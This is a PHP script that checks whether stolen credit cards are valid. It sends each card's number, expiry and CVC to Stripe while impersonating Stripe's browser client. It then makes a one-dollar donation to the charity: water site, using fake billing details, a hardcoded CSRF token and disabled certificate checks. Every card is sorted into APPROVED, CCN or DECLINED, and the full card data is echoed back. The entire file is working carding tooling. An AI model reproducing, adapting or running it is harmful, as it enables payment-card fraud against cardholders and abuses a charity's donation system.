<?php
require_once '../vendor/autoload.php';
use Dotenv\Dotenv;

// Load environment variables
$dotenv = Dotenv::createImmutable(__DIR__ . '/..');
$dotenv->load();

header('Content-Type: text/plain');

try {
    // Retrieve card details from POST
    $cardNumber = $_POST['card']['number'] ?? '';
    $expMonth = $_POST['card']['exp_month'] ?? '';
    $expYear = $_POST['card']['exp_year'] ?? '';
    $cvc = $_POST['card']['cvc'] ?? '';

    // Validate card details
    if (!preg_match('/^\d{13,19}$/', $cardNumber)) {
        echo "DECLINED|Invalid card number|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }
    if (!preg_match('/^\d{1,2}$/', $expMonth) || (int)$expMonth < 1 || (int)$expMonth > 12) {
        echo "DECLINED|Invalid expiry month|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }
    if (!preg_match('/^\d{2,4}$/', $expYear)) {
        echo "DECLINED|Invalid expiry year|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        echo "DECLINED|Invalid CVC|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }

    // Normalize expiry year (2 or 4 digits)
    $expYear = strlen($expYear) === 2 ? ((int)$expYear < 50 ? '20' . $expYear : '19' . $expYear) : $expYear;

    // Step 1: Create payment method
    $url1 = 'https://api.stripe.com/v1/payment_methods';
    $headers1 = [
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
    ];
    $data1 = http_build_query([
        'type' => 'card',
        'billing_details[address][city]' => 'New york',
        'billing_details[address][country]' => 'IN',
        'billing_details[address][line1]' => 'A27 shsh',
        'billing_details[email]' => 'xavhsu27@gmail.com',
        'billing_details[name]' => 'John Smith',
        'card[number]' => $cardNumber,
        'card[cvc]' => $cvc,
        'card[exp_month]' => $expMonth,
        'card[exp_year]' => $expYear,
        'key' => $_ENV['STRIPE_PUBLIC_KEY']
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response1 = curl_exec($ch);
    $httpCode1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode1 !== 200 && $httpCode1 !== 201) {
        $errorData = json_decode($response1, true);
        $errorMsg = $errorData['error']['message'] ?? 'Unknown error';
        $errorCode = $errorData['error']['code'] ?? '';
        $ccnPatterns = ['security code is incorrect', 'incorrect_cvc', 'cvc_check_failed', 'Gateway Rejected: cvv', 'Card Issuer Declined CVV'];
        if ($errorCode && in_array(strtolower($errorCode), array_map('strtolower', $ccnPatterns)) || strpos(strtolower($errorMsg), 'cvc') !== false) {
            echo "CCN|$errorMsg, $errorCode|$cardNumber|$expMonth|$expYear|$cvc";
        } else {
            echo "DECLINED|$errorMsg" . ($errorCode ? ", $errorCode" : "") . "|$cardNumber|$expMonth|$expYear|$cvc";
        }
        exit;
    }

    $respData1 = json_decode($response1, true);
    $pmid = $respData1['id'] ?? '';
    if (!$pmid) {
        echo "DECLINED|Payment method creation failed|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }

    // Step 2: Donation request
    $url2 = 'https://www.charitywater.org/donate/stripe';
    $headers2 = [
        'Accept: */*',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Origin: https://www.charitywater.org',
        'Referer: https://www.charitywater.org/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'X-CSRF-Token: G6M57A4FuXbsZPZSEK0MAEXhL_9EluoMxuHDF8qR5JDhDtqmBmygTdfZJX5x2RQg-yCWAn2llWRv4oGe8yu04A',
        'X-Requested-With: XMLHttpRequest'
    ];
    $data2 = http_build_query([
        'country' => 'us',
        'payment_intent[email]' => 'xavh7272u27@gmail.com',
        'payment_intent[amount]' => '1',
        'payment_intent[currency]' => 'usd',
        'payment_intent[metadata][donation_kind]' => 'water',
        'payment_intent[payment_method]' => $pmid,
        'donation_form[amount]' => '1',
        'donation_form[email]' => 'xavh7272u27@gmail.com',
        'donation_form[name]' => 'John',
        'donation_form[surname]' => 'Smith',
        'donation_form[campaign_id]' => 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[metadata][donation_kind]' => 'water',
        'donation_form[metadata][email_consent_granted]' => 'true',
        'donation_form[address][address_line_1]' => 'A27 shsh',
        'donation_form[address][city]' => 'New york',
        'donation_form[address][country]' => 'IN',
        'donation_form[address][zip]' => '10001'
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url2);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data2);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers2);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response2 = curl_exec($ch);
    $httpCode2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Parse response
    $ccnPatterns = ['security code is incorrect', 'incorrect_cvc', 'cvc_check_failed', 'Gateway Rejected: cvv', 'Card Issuer Declined CVV'];
    $successPatterns = ['success', 'approved', 'completed', 'thank you'];

    $responseText = strtolower($response2);
    if (in_array(true, array_map(function($pattern) use ($responseText) { return strpos($responseText, strtolower($pattern)) !== false; }, $ccnPatterns))) {
        echo "CCN|CVC check failed|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }

    if (in_array(true, array_map(function($pattern) use ($responseText) { return strpos($responseText, strtolower($pattern)) !== false; }, $successPatterns))) {
        echo "APPROVED|Payment successful|$cardNumber|$expMonth|$expYear|$cvc";
        exit;
    }

    $responseData = json_decode($response2, true);
    if ($responseData) {
        if (isset($responseData['error'])) {
            $message = is_array($responseData['error']) ? ($responseData['error']['message'] ?? 'Unknown error') : $responseData['error'];
            $code = is_array($responseData['error']) ? ($responseData['error']['code'] ?? '') : '';
            if ($code && in_array(strtolower($code), array_map('strtolower', $ccnPatterns))) {
                echo "CCN|$message, $code|$cardNumber|$expMonth|$expYear|$cvc";
            } else {
                echo "DECLINED|$message" . ($code ? ", $code" : "") . "|$cardNumber|$expMonth|$expYear|$cvc";
            }
            exit;
        }
        if (isset($responseData['success']) || (isset($responseData['status']) && $responseData['status'] === 'succeeded')) {
            echo "APPROVED|Payment successful|$cardNumber|$expMonth|$expYear|$cvc";
            exit;
        }
    }

    echo "DECLINED|Unknown decline reason|$cardNumber|$expMonth|$expYear|$cvc";
} catch (Exception $e) {
    echo "DECLINED|Processing error: {$e->getMessage()}|$cardNumber|$expMonth|$expYear|$cvc";
}
?>
